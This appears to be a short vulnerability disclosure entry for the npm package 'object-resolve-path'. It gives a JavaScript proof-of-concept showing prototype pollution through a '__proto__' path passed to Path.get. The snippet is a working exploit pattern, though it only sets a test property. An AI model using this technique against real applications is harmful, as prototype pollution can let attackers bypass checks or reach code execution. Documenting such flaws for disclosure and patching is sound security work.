# object-resolve-path

- package name: `object-resolve-path`

- PoC exploit:

```javascript
var Path = require('object-resolve-path/path');
assert(({}).polluted === undefined);

Path.get(['__proto__', 'polluted']).setValueFrom({}, 'yes');
assert(({}).polluted === 'yes');
```